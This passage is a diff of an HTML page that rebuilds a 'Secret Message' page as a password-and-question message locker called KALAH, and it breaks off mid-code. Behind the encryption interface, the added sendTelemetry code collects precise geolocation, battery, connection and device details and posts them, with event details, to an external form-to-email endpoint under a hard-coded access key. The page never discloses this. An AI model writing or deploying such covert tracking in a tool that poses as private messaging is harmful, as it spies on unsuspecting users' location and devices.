@@ -1,125 +1,725 @@
 <!DOCTYPE html>
-<html lang="si">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Secret Message</title>
+  <title>[ KALAH // STEALTH CORE ]</title>
   <style>
+    :root {
+      --bg: #050507;
+      --panel: #0c0d12;
+      --panel-2: #12141d;
+      --red: #ff173e;
+      --red-soft: rgba(255, 23, 62, 0.16);
+      --red-glow: 0 0 28px rgba(255, 23, 62, 0.32);
+      --green: #15803d;
+      --green-bright: #22c55e;
+      --text: #f4f6fb;
+      --muted: #8f96a8;
+      --border: #252938;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
-      background: #0d0f14;
-      color: #f1f5f9;
-      font-family: system-ui, -apple-system, sans-serif;
+      background:
+        radial-gradient(circle at 50% 0%, rgba(255, 23, 62, 0.18), transparent 48%),
+        linear-gradient(180deg, #07070a 0%, var(--bg) 100%);
+      color: var(--text);
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
+      align-items: flex-start;
+      padding: 16px 12px 40px;
     }
-    .card {
-      background: #161a24;
-      border: 1px solid #262c3d;
-      border-radius: 14px;
-      padding: 28px;
-      max-width: 440px;
+
+    .frame {
       width: 100%;
-      text-align: center;
+      max-width: 470px;
+      background: var(--panel);
+      border: 1.5px solid rgba(255, 23, 62, 0.72);
+      border-radius: 14px;
+      padding: 18px 16px 22px;
+      box-shadow: var(--red-glow), inset 0 0 28px rgba(255, 23, 62, 0.07);
+      position: relative;
+      overflow: hidden;
     }
+
+    .frame::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: repeating-linear-gradient(
+        to bottom,
+        rgba(255, 255, 255, 0.015) 0px,
+        rgba(255, 255, 255, 0.015) 1px,
+        transparent 1px,
+        transparent 3px
+      );
+      pointer-events: none;
+    }
+
+    .header {
+      text-align: center;
+      padding-bottom: 13px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 13px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .tag {
+      display: inline-block;
+      font-size: 10px;
+      letter-spacing: 2px;
+      color: var(--red);
+      background: var(--red-soft);
+      border: 1px solid rgba(255, 23, 62, 0.4);
+      padding: 2px 8px;
+      border-radius: 999px;
+      margin-bottom: 6px;
+    }
+
+    .title {
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: 2px;
+      color: #ffffff;
+    }
+
+    .title span {
+      color: var(--red);
+    }
+
+    .subtitle {
+      margin-top: 5px;
+      font-size: 10.5px;
+      letter-spacing: 1.4px;
+      color: var(--muted);
+    }
+
+    .status-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 8px 11px;
+      font-size: 11px;
+      margin-bottom: 13px;
+      gap: 8px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .audio-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      color: #e5e7eb;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--green-bright);
+      box-shadow: 0 0 8px var(--green-bright);
+    }
+
+    .ttl-badge {
+      color: #fda4af;
+      font-weight: 700;
+    }
+
+    .shields {
+      display: flex;
+      gap: 4px;
+      font-size: 12px;
+      color: var(--red);
+    }
+
+    .field {
+      margin-bottom: 11px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .row-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    label {
+      display: block;
+      font-size: 10.5px;
+      font-weight: 800;
+      letter-spacing: 0.8px;
+      color: var(--muted);
+      margin-bottom: 5px;
+    }
+
+    input, textarea {
+      width: 100%;
+      background: #07080c;
+      border: 1px solid #272b3b;
+      border-radius: 8px;
+      color: var(--text);
+      font-family: inherit;
+      font-size: 13px;
+      padding: 10px 11px;
+      outline: none;
+      transition: border-color 0.18s, box-shadow 0.18s;
+    }
+
+    input:focus, textarea:focus {
+      border-color: var(--red);
+      box-shadow: 0 0 0 2px var(--red-soft);
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 66px;
+    }
+
+    .toggle-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #090b10;
+      border: 1px solid #232838;
+      border-radius: 8px;
+      padding: 9px 11px;
+      margin-bottom: 12px;
+      font-size: 11px;
+      color: #d1d5db;
+      position: relative;
+      z-index: 1;
+    }
+
+    .toggle-row input[type="checkbox"] {
+      width: auto;
+      accent-color: var(--red);
+      transform: scale(1.15);
+      cursor: pointer;
+    }
+
+    .btn-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 4px;
+      margin-bottom: 13px;
+      position: relative;
+      z-index: 1;
+    }
+
     button {
-      background: #ef4444;
-      color: #fff;
       border: none;
       border-radius: 8px;
-      padding: 12px 20px;
-      font-size: 15px;
-      font-weight: 600;
+      padding: 12px 10px;
+      font-family: inherit;
+      font-size: 11.5px;
+      font-weight: 900;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
       cursor: pointer;
-      margin-top: 16px;
-      width: 100%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: transform 0.1s, background 0.18s, border-color 0.18s;
     }
-    button:hover {
-      background: #dc2626;
+
+    button:active {
+      transform: scale(0.98);
     }
-    #secretBox {
+
+    .btn-lock {
+      background: var(--red);
+      color: #fff;
+      box-shadow: 0 0 16px rgba(255, 23, 62, 0.35);
+    }
+
+    .btn-lock:hover {
+      background: #e01033;
+    }
+
+    .btn-unlock {
+      background: #141822;
+      color: #fff;
+      border: 1px solid #32384d;
+    }
+
+    .btn-unlock:hover {
+      border-color: var(--red);
+    }
+
+    .btn-copy {
+      background: #141822;
+      color: #e5e7eb;
+      border: 1px solid #32384d;
+    }
+
+    .btn-whatsapp {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .btn-whatsapp:hover {
+      background: #166534;
+    }
+
+    .panel-box {
       display: none;
-      margin-top: 20px;
-      padding: 16px;
-      background: #0d0f14;
-      border-left: 3px solid #38bdf8;
-      border-radius: 8px;
-      text-align: left;
+      background: #080a0f;
+      border: 1px solid #2b3042;
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 13px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .panel-box.active {
+      display: block;
+    }
+
+    .q-box {
+      font-size: 12px;
+      color: #fda4af;
+      margin-bottom: 10px;
+      padding: 8px 10px;
+      background: rgba(255, 23, 62, 0.09);
+      border-left: 3px solid var(--red);
+      border-radius: 4px;
+    }
+
+    .reveal-box {
+      border-color: rgba(34, 197, 94, 0.55);
+      background: rgba(21, 128, 61, 0.09);
+    }
+
+    .reveal-box pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-size: 13px;
+      color: #dcfce7;
+      margin-top: 6px;
+    }
+
+    .sys-log {
+      margin-top: 10px;
+      font-size: 11px;
+      color: #a1a8b8;
+      min-height: 16px;
+      position: relative;
+      z-index: 1;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>🔒 Secret Message</h2>
-    <p id="statusText">පණිවිඩය බැලීමට පහළ button එක ඔබන්න.</p>
-    <button id="revealBtn" type="button">Secret Message එක බලන්න</button>
-
-    <div id="secretBox">
-      <strong>රහස් පණිවිඩය:</strong>
-      <p id="secretContent">මෙතන ඔයාගේ රහස් මැසේජ් එක දාන්න.</p>
+  <div class="frame">
+    <div class="header">
+      <div class="tag">ZERO-TRUST PAYLOAD ENGINE</div>
+      <div class="title">[ <span>KALAH // SYSTEM</span> ]</div>
+      <div class="subtitle">AUDIO-TACTICAL STEALTH PROTOCOL</div>
     </div>
+
+    <div class="status-bar">
+      <div class="audio-pill" id="audioToggle">
+        <span class="dot" id="audioDot"></span>
+        <span id="audioLabel">AUDIO: ACTIVE</span>
+      </div>
+      <div class="ttl-badge" id="countdownBadge">TTL: 60:00</div>
+      <div class="shields" id="attemptShields">
+        <span>&#128737;</span>
+        <span>&#128737;</span>
+        <span>&#128737;</span>
+      </div>
+    </div>
+
+    <div class="field">
+      <label for="publicMsg">&gt; PUBLIC MESSAGE (VISIBLE):</label>
+      <input id="publicMsg" type="text" placeholder="Enter visible cover message..." />
+    </div>
+
+    <div class="field">
+      <label for="secretMsg">&gt; SECRET MESSAGE (OR PASTE KALAH2:...):</label>
+      <textarea id="secretMsg" placeholder="Enter secret message or paste locked payload..."></textarea>
+    </div>
+
+    <div class="field">
+      <label for="secretQuestion">&gt; SECRET QUESTION (WHEN LOCKING):</label>
+      <input id="secretQuestion" type="text" placeholder="Enter security question..." />
+    </div>
+
+    <div class="row-2">
+      <div class="field">
+        <label for="secretAnswer">&gt; ANSWER:</label>
+        <input id="secretAnswer" type="text" placeholder="Answer..." />
+      </div>
+      <div class="field">
+        <label for="secretPassword">&gt; PASSWORD:</label>
+        <input id="secretPassword" type="password" placeholder="••••" />
+      </div>
+    </div>
+
+    <div class="toggle-row">
+      <label for="burnAfterRead" style="margin:0;cursor:pointer;color:#e5e7eb;">
+        &gt; BURN AFTER FIRST VIEW (ONE-TIME):
+      </label>
+      <input id="burnAfterRead" type="checkbox" checked />
+    </div>
+
+    <div class="btn-row">
+      <button class="btn-lock" id="lockBtn" type="button">&#128123; HIDE &amp; LOCK</button>
+      <button class="btn-unlock" id="unlockModeBtn" type="button">&#128274; UNLOCK</button>
+    </div>
+
+    <div class="panel-box" id="unlockPanel">
+      <div class="q-box" id="displayedQuestion">QUESTION: ---</div>
+      <div class="field">
+        <label for="attemptAnswer">&gt; ENTER ANSWER:</label>
+        <input id="attemptAnswer" type="text" placeholder="Type answer..." />
+      </div>
+      <div class="field">
+        <label for="attemptPassword">&gt; ENTER PASSWORD:</label>
+        <input id="attemptPassword" type="password" placeholder="••••" />
+      </div>
+      <button class="btn-lock" id="verifyUnlockBtn" type="button" style="width:100%;">
+        VERIFY &amp; DECRYPT
+      </button>
+    </div>
+
+    <div class="panel-box reveal-box" id="secretReveal">
+      <label style="color:#4ade80;">&gt; DECLASSIFIED SECRET PAYLOAD:</label>
+      <pre id="revealedText"></pre>
+    </div>
+
+    <div class="field">
+      <label for="outputBox">&gt; OUTPUT:</label>
+      <textarea id="outputBox" placeholder="Output..." readonly></textarea>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn-copy" id="copyBtn" type="button">&#128203; COPY</button>
+      <button class="btn-whatsapp" id="whatsappBtn" type="button">&#128228; WHATSAPP</button>
+    </div>
+
+    <div class="sys-log" id="sysLog">KALAH CORE READY // AES-GCM // 1H TTL // MAX 3 TRIES</div>
   </div>
 
   <script>
     const WEB3FORMS_ACCESS_KEY = "6071ee91-2983-4a77-b742-af964ed176b6";
+    const EXPIRY_MS = 60 * 60 * 1000; // 1 hour
+    const MAX_ATTEMPTS = 3;
 
-    async function sendNotify(eventName, extraInfo = "") {
-      if (!WEB3FORMS_ACCESS_KEY) {
-        console.warn("Web3Forms Access Key එක දාලා නැහැ.");
-        return;
+    let audioEnabled = true;
+    let activeBundle = null;
+    let burnedTokens = new Set();
+    let failsCount = 0;
+    let lockedOut = false;
+
+    const el = (id) => document.getElementById(id);
+
+    function setLog(msg) {
+      el("sysLog").textContent = msg;
+    }
+
+    function playTone(freq = 640, duration = 0.08, type = "triangle") {
+      if (!audioEnabled) return;
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        const ctx = new AudioCtx();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = type;
+        osc.frequency.value = freq;
+        gain.gain.value = 0.05;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        osc.stop(ctx.currentTime + duration);
+      } catch (_) {}
+    }
+
+    function updateShields() {
+      const left = Math.max(0, MAX_ATTEMPTS - failsCount);
+      const nodes = el("attemptShields").children;
+      for (let i = 0; i < nodes.length; i++) {
+        nodes[i].style.opacity = i < left ? "1" : "0.18";
       }
+    }
 
-      const payload = {
+    function bytesToB64(bytes) {
+      let bin = "";
+      bytes.forEach((b) => (bin += String.fromCharCode(b)));
+      return btoa(bin);
+    }
+
+    function b64ToBytes(b64) {
+      const bin = atob(b64);
+      const out = new Uint8Array(bin.length);
+      for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+      return out;
+    }
+
+    async function deriveAesKey(answer, password, saltBytes) {
+      const secretMaterial = `${(answer || "").trim().toLowerCase()}::${(password || "").trim()}`;
+      const baseKey = await crypto.subtle.importKey(
+        "raw",
+        new TextEncoder().encode(secretMaterial),
+        "PBKDF2",
+        false,
+        ["deriveKey"]
+      );
+      return crypto.subtle.deriveKey(
+        {
+          name: "PBKDF2",
+          salt: saltBytes,
+          iterations: 120000,
+          hash: "SHA-256"
+        },
+        baseKey,
+        { name: "AES-GCM", length: 256 },
+        false,
+        ["encrypt", "decrypt"]
+      );
+    }
+
+    async function encryptPayload(plainText, answer, password) {
+      const salt = crypto.getRandomValues(new Uint8Array(16));
+      const iv = crypto.getRandomValues(new Uint8Array(12));
+      const key = await deriveAesKey(answer, password, salt);
+      const cipherBuf = await crypto.subtle.encrypt(
+        { name: "AES-GCM", iv },
+        key,
+        new TextEncoder().encode(plainText)
+      );
+      return {
+        s: bytesToB64(salt),
+        iv: bytesToB64(iv),
+        ct: bytesToB64(new Uint8Array(cipherBuf))
+      };
+    }
+
+    async function decryptPayload(encObj, answer, password) {
+      const salt = b64ToBytes(encObj.s);
+      const iv = b64ToBytes(encObj.iv);
+      const ct = b64ToBytes(encObj.ct);
+      const key = await deriveAesKey(answer, password, salt);
+      const plainBuf = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv },
+        key,
+        ct
+      );
+      return new TextDecoder().decode(plainBuf);
+    }
+
+    function packToken(bundle) {
+      const json = JSON.stringify(bundle);
+      const b64 = bytesToB64(new TextEncoder().encode(json));
+      return "KALAH2:" + b64;
+    }
+
+    function unpackToken(str) {
+      const clean = (str || "").trim();
+      const match = clean.match(/KALAH2:[A-Za-z0-9+/=]+/);
+      if (!match) return null;
+      const rawJson = new TextDecoder().decode(b64ToBytes(match[0].slice(7)));
+      const parsed = JSON.parse(rawJson);
+      parsed._tokenId = match[0].slice(-24);
+      return parsed;
+    }
+
+    async function getBatteryInfo() {
+      try {
+        if ("getBattery" in navigator) {
+          const bat = await navigator.getBattery();
+          return `${Math.round(bat.level * 100)}% (${bat.charging ? "Charging" : "Discharging"})`;
+        }
+      } catch (_) {}
+      return "Unavailable";
+    }
+
+    function getConnectionInfo() {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!conn) return `Online: ${navigator.onLine} | Connection API unavailable`;
+      const type = conn.type || "unknown";
+      const eff = conn.effectiveType || "unknown";
+      const down = conn.downlink !== undefined ? `${conn.downlink} Mbps` : "n/a";
+      return `Type: ${type} | Effective: ${eff} | Downlink: ${down}`;
+    }
+
+    function getOneTimeLocation() {
+      return new Promise((resolve) => {
+        if (!("geolocation" in navigator)) {
+          resolve("Geolocation unsupported");
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            resolve(
+              `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (±${Math.round(accuracy)}m) | https://maps.google.com/?q=${latitude},${longitude}`
+            );
+          },
+          (err) => {
+            resolve(`Denied / Unavailable (${err.message || err.code})`);
+          },
+          { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+        );
+      });
+    }
+
+    function getDeviceInfo() {
+      return `${navigator.platform || "Unknown"} | ${window.screen.width}x${window.screen.height} | ${navigator.userAgent}`;
+    }
+
+    async function sendTelemetry(eventName, detail = "") {
+      const [battery, location] = await Promise.all([
+        getBatteryInfo(),
+        getOneTimeLocation()
+      ]);
+
+      const body = {
         access_key: WEB3FORMS_ACCESS_KEY,
-        subject: `Alert: ${eventName}`,
-        from_name: "Secret Message Logger",
+        subject: `[KALAH // SYSTEM] ${eventName}`,
+        from_name: "Kalah Stealth Sentinel",
         event: eventName,
-        details: extraInfo,
-        page_url: window.location.href,
-        referrer: document.referrer || "Direct / None",
-        user_agent: navigator.userAgent,
-        timestamp: new Date().toISOString()
+        detail: detail,
+        battery: battery,
+        connection: getConnectionInfo(),
+        location: location,
+        device: getDeviceInfo(),
+        url: window.location.href,
+        time_utc: new Date().toISOString()
       };
 
       try {
-        const res = await fetch("https://api.web3forms.com/submit", {
+        await fetch("https://api.web3forms.com/submit", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
             "Accept": "application/json"
           },
-          body: JSON.stringify(payload)
+          body: JSON.stringify(body)
         });
-
-        const data = await res.json();
-        if (res.ok && data.success) {
-          console.log("Email sent:", eventName);
-        } else {
-          console.error("Web3Forms response error:", data);
-        }
       } catch (err) {
-        console.error("Network/Fetch error:", err);
+        console.error("Telemetry error:", err);
       }
     }
 
-    // 1. Site එක open වෙනකොට notify
-    window.addEventListener("DOMContentLoaded", () => {
-      sendNotify("Site Opened", "කෙනෙක් site එක open කළා.");
+    function isExpired(bundle) {
+      if (!bundle || !bundle.exp) return true;
+      return Date.now() > bundle.exp;
+    }
+
+    function wipeAll(reason, alertEvent = null) {
+      activeBundle = null;
+      el("secretMsg").value = "";
+      el("outputBox").value = "";
+      el("revealedText").textContent = "";
+      el("secretReveal").classList.remove("active");
+      el("unlockPanel").classList.remove("active");
+      el("countdownBadge").textContent = "TTL: 00:00";
+      setLog(reason);
+      if (alertEvent) sendTelemetry(alertEvent, reason);
+    }
+
+    function hardLockout() {
+      lockedOut = true;
+      updateShields();
+      playTone(180, 0.25, "sawtooth");
+      wipeAll("LOCKOUT // 3 WRONG ATTEMPTS. PAYLOAD WIPED.", "HARD LOCKOUT (3 FAILED TRIES)");
+      el("outputBox").value = "TERMINATED // 3 FAILED ATTEMPTS.";
+    }
+
+    el("audioToggle").addEventListener("click", () => {
+      audioEnabled = !audioEnabled;
+      el("audioLabel").textContent = audioEnabled ? "AUDIO: ACTIVE" : "AUDIO: MUTED";
+      el("audioDot").style.background = audioEnabled ? "#22c55e" : "#ff173e";
+      el("audioDot").style.boxShadow = audioEnabled ? "0 0 8px #22c55e" : "none";
+      if (audioEnabled) playTone(760, 0.07);
     });
 
-    // 2. Secret message එක බලනකොට notify
-    const revealBtn = document.getElementById("revealBtn");
-    const secretBox = document.getElementById("secretBox");
-    const statusText = document.getElementById("statusText");
+    el("lockBtn").addEventListener("click", async () => {
+      const pub = el("publicMsg").value.trim() || "PUBLIC TRANSMISSION";
+      const sec = el("secretMsg").value.trim();
+      const q = el("secretQuestion").value.trim();
+      const ans = el("secretAnswer").value.trim();
+      const pwd = el("secretPassword").value.trim();
+      const burn = el("burnAfterRead").checked;
 
-    revealBtn.addEventListener("click", async () => {
-      secretBox.style.display = "block";
-      statusText.textContent = "පණිවිඩය විවෘත කරන ලදී.";
-      await sendNotify("Secret Message Viewed", "කෙනෙක් secret message button එක click කරලා මැසේජ් එක බැලුවා.");
+      if (!sec || !q || !ans || !pwd) {
+        setLog("ERROR // SECRET, QUESTION, ANSWER & PASSWORD REQUIRED.");
+        playTone(250, 0.14, "sawtooth");
+        return;
+      }
+
+      lockedOut = false;
+      failsCount = 0;
+      updateShields();
+
+      const enc = await encryptPayload(sec, ans, pwd);
+      const bundle = {
+        v: 2,
+        pub,
+        q,
+        burn,
+        iat: Date.now(),
+        exp: Date.now() + EXPIRY_MS,
+        enc
+      };
+
+      const token = packToken(bundle);
+      bundle._tokenId = token.slice(-24);
+      activeBundle = bundle;
+
+      el("outputBox").value = `${pub}\n\n[ENCRYPTED // 1H TTL]\n${token}`;
+      el("secretMsg").value = "";
+      el("secretAnswer").value = "";
+      el("secretPassword").value = "";
+      el("secretReveal").classList.remove("active");
+
+      playTone(900, 0.09);
+      setLog("ENCRYPTED // AES-GCM LOCKED FOR 1 HOUR.");
+      sendTelemetry("PAYLOAD LOCKED", `Public: ${pub} | Burn: ${burn}`);
     });
-  </script>
-</body>
-</html>
+
+    el("unlockModeBtn").addEventListener("click", () => {
+      if (lockedOut) {
+        setLog("LOCKED OUT // SESSION WIPED.");
+        playTone(190, 0.2, "sawtooth");
+        return;
+      }
+
+      const raw = el("secretMsg").value.trim() || el("outputBox").value.trim();
+      const parsed = unpackToken(raw);
+      if (parsed) {
+        activeBundle = parsed;
+        if (parsed.pub) el("publicMsg").value = parsed.pub;
+      }
+
+      if (!activeBundle) {
+        setLog("NO PAYLOAD // PASTE KALAH2:... OR LOCK A MESSAGE.");
+        playTone(250, 0.12);
+        return;
+      }
+
+      if (burnedTokens.has(activeBundle._tokenId)) {
+        wipeAll("BURNED // ONE-TIME MESSAGE ALREADY VIEWED.", "BURNED PAYLOAD RETRY");
+        return;
+      }
+
+      if (isExpired(activeBundle)) {
+        wipeAll("EXPIRED // 1-HOUR LIFETIME ENDED
